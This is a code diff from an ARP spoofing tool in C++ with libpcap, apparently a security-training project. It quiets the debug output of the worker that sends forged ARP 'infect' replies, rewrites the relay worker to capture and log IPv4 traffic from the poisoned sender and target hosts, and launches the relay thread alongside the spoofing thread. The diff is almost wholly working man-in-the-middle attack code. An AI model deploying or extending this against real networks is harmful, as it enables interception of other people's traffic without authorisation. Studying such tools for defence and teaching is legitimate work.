@@ -259,14 +259,14 @@ void SpoofWorker(const char* deviceName_, Mac MyMac_,
 				fprintf(stderr, "@SpoofWorker: pcap_sendpacket error=%s\n", pcap_geterr(handle));
 				return;
 			}
-			printf("%s -> %s\n", std::string(pktArpRepInfectSenderList.at(i).eth_.smac()).c_str(), std::string(pktArpRepInfectSenderList.at(i).eth_.dmac()).c_str());
+			//printf("%s -> %s\n", std::string(pktArpRepInfectSenderList.at(i).eth_.smac()).c_str(), std::string(pktArpRepInfectSenderList.at(i).eth_.dmac()).c_str());
 
 			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktArpRepInfectTargetList.at(i)), sizeof(EthArpPacket));
 			if (res != 0) {
 				fprintf(stderr, "@SpoofWorker: pcap_sendpacket error=%s\n", pcap_geterr(handle));
 				return;
 			}
-			printf("%s -> %s\n", std::string(pktArpRepInfectTargetList.at(i).eth_.smac()).c_str(), std::string(pktArpRepInfectTargetList.at(i).eth_.dmac()).c_str());
+			//printf("%s -> %s\n", std::string(pktArpRepInfectTargetList.at(i).eth_.smac()).c_str(), std::string(pktArpRepInfectTargetList.at(i).eth_.dmac()).c_str());
 		}
 	}
 	return;
@@ -299,28 +299,29 @@ void RelayWorker(const char* deviceName_, Mac MyMac_,
 		const u_char* rawRecv;
 		res = pcap_next_ex(handle, &header, &rawRecv);
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-			printf("@RelayWorker: pcap_next_ex error=%s\n", res, pcap_geterr(handle));
+			printf("@RelayWorker: pcap_next_ex error=%s\n", pcap_geterr(handle));
 			return;
 		}
 
-		EthHdr* ethHdr = (EthHdr*)rawRecv;
-		if (ethHdr->type_ == EthHdr::Ip4){
-			// capture Ipv4.
-		}
-		else if (ethHdr->type_ == EthHdr::Ip6){
-			// drop Ipv6.
-			continue;
-		}
-		else if (ethHdr->type_ == EthHdr::Arp){
-			// drop ARP.
+		// relay only Eth + Ipv4 + Tcp packet.
+		eEthIpv4TcpPacket* pktHdr = (eEthIpv4TcpPacket*)rawRecv;
+		if (ntohs (pktHdr->eth_.type_) != EthHdr::Ip4){
+			// drop Ipv6, arp, etc.
 			continue;
 		}
 
-		
-		
-		const uint32_t pktSize = header->caplen;
-
-		
+		for(int i = 0; i < listSize; i++){
+			if (ntohl(pktHdr->eIpv4Hdr_.SRC_IP_ADDR) == SenderIpList_.at(i)){
+				// sender -> ...
+				printf("@RelayWorker: cap\t%s -> %s\n", std::string(SenderIpList_.at(i)).c_str(), std::string(Ip(ntohl(pktHdr->eIpv4Hdr_.DST_IP_ADDR))).c_str());
+				break;
+			}
+			else if (ntohl(pktHdr->eIpv4Hdr_.SRC_IP_ADDR) == TargetIpList_.at(i)){
+				// target -> ...
+				printf("@RelayWorker: cap\t%s -> %s\n", std::string(TargetIpList_.at(i)).c_str(), std::string(Ip(ntohl(pktHdr->eIpv4Hdr_.DST_IP_ADDR))).c_str());
+				break;
+			}
+		}
 	}
 	return;
 }
@@ -397,6 +398,8 @@ int main(int argc, char* argv[]) {
 	}
 
 	std::thread SpoofThread(SpoofWorker, dev, MyMac, senderIpList, senderMacList, targetIpList, targetMacList, 1);
+	std::thread RealyThread(RelayWorker, dev, MyMac, senderIpList, senderMacList, targetIpList, targetMacList);
+	RealyThread.join();
 	SpoofThread.join();
 	printf("@@\n");
 	
